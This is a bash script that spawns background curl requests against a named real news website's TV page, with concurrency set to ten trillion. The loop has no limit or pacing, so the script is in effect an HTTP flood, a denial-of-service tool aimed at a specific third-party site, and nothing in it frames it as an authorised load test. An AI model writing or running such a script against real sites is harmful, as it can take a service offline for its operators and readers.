#!/bin/bash

# Number of concurrent requests
concurrency=10000000000000

# URL to send requests to
url="https://www.citizen.digital/tv/citizen-tv-15"

# Function to send a single request
send_request() {
    # Send the request and capture the output in a variable
    response=$(curl -sS "$url")
    
    # Get the size of the response in bytes
    size=$(echo -n "$response" | wc -c)
    
    # Display the size of the response
    echo "Size: $size bytes"
}

# Loop to send concurrent requests
for ((i=1; i<=$concurrency; i++)); do
    # Send requests in the background
    send_request &
done

# Wait for all background processes to finish
wait
